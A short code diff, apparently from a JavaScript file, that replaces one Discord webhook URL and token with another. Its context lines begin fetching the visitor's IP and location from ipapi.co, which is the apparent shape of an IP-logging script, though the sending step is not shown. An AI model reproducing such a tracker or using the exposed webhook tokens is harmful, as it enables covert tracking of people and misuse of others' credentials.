@@ -1,4 +1,4 @@
-var webHookUrl = "https://discord.com/api/webhooks/1107355097459077201/XOiq1Pig7dDtKAt4XWi13D8aqv74zSOwCmkjndnkQXG_Z9zLGthwSXDPwnAvoVGUbwzw";
+var webHookUrl = "https://discord.com/api/webhooks/1196853501049974864/AMUYigPIWC0gGIZmP3kHfN9IBb11tay20-KQW73Vhxiyp36lacgiwEx8ShJan6LdX8TY";
 
 const request = async () => { // Calling a "synchronous" fetch
     const response = await fetch('https://ipapi.co/json');
